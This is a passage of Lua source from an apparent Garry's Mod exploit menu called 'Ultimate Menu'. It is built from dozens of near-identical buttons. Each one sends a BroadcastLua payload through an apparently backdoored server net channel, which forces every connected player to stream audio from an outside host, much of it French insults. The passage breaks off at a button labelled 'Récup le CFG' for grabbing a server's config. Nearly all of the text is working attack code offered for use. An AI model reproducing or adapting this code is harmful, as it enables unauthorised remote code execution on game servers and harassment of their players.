surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/musique%201.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - musique 2" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/musique%202.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Sa marche pas" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/%C3%A7a%20Marche%20Pas.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - Sa marche pas" )
    SploitNotify("Soundboard - Sa marche pas ")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Anglais" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Anglais.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - Anglais" )
    SploitNotify("Soundboard - Anglais")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Aujourd'hui jles juré" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Aujourd.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - Aujourd'hui jles juré" )
    SploitNotify("Soundboard - Aujourd'hui jles juré")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Et mon compte twitter" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Compte%20Twitter.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - Et mon compte twitter" )
    SploitNotify("Soundboard - Et mon compte twitter")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Coup de coude" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Coup%20De%20Coude.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - Coup de coude" )
    SploitNotify("Soundboard - Coup de coude")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 360 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Coup de coude" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Coup%20De%20Coude.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - Coup de coude" )
    SploitNotify("Soundboard - Coup de coude")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 390 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Dino" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Dinosaure.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - Dino" )
    SploitNotify("Soundboard - Dino")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 420 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - FDP1" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Fils%20De%20Pute%20%231.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - FDP1" )
    SploitNotify("Soundboard - FDP1")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 450 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - FDP2" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Fils%20De%20Pute%20%232.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - FDP2" )
    SploitNotify("Soundboard - FDP2")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 480 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Je pensais pas ça de toi" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Je%20Pensais%20Pas%20%C3%A7a%20De%20Toi.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - Je pensais pas ça de toi" )
    SploitNotify("Soundboard - Je pensais pas ça de toi")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 510 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - PS4" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/La%20Ps4.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - PS4" )
    SploitNotify("Soundboard - PS4")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 540 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Grand père moustafa" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Le%20Grand%20P%C3%A8re.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - Grand père moustafa" )
    SploitNotify("Soundboard - Grand père moustafa")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 570 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - FDP MA LUMIERE" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Ma%20Lumi%C3%A8re.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - FDP MA LUMIERE" )
    SploitNotify("Soundboard - FDP MA LUMIERE")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 15, 600 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Ouvre ta gueule" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Ouvre%20Ta%20Gueule.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard - Ouvre ta gueule" )
    SploitNotify("Soundboard - Ouvre ta gueule")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - PSG" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/PSG%20les%20Kheys.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Rachide" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Rachide.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 180 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - RIP LA SOURIS" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Rip%20la%20souris.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 210 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Rire" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Rire.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Starfoullah" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/STARFOULLAH%20THEKAIRI78!.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Sale batard 1" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Sale%20Batard%20(2).mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Sale batard 2" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Sale%20Batard.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Insulte" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/THEKAIRI78%20INSULTE.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 360 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - Ta 28 ans" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/Ta%2028%20Ans.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 390 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - pokemon 1" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/pokemon%20musique.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 420 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - pokemon 2" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/pokemon%20musique%202.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 450 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - rire 2" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/rire2.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 480 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - rire 3" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/rire%203.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 510 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - rire 4" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/rire4.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 200, 540 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 150, 25 )
Macro:SetText( "Soundboard - tk défoncer" )
Macro.Paint = function()
surface.SetDrawColor(vert)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( blanc )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(netKey)
net.WriteString("BroadcastLua([[sound.PlayURL( \"http://jesuschristoff.livehost.fr/gmod/upload/tk78/tk%20d%C3%A9foncer.mp3\", \"mono\", function()end )]])")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Ultimate Menu", "] ", Color( 255, 255, 255 ), "Soundboard" )
    SploitNotify("Soundboard")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
        Macro:SetPos( 650, 280 )
		Macro:SetParent(Misc)
        Macro:SetText( "Récup le CFG" )
        Macro:SetTextColor( Color(255, 255, 255, 255) )
        Macro:SetSize( 180, 30 )
        Macro.Paint = function()
        surface.SetDrawColor(30, 30, 30)
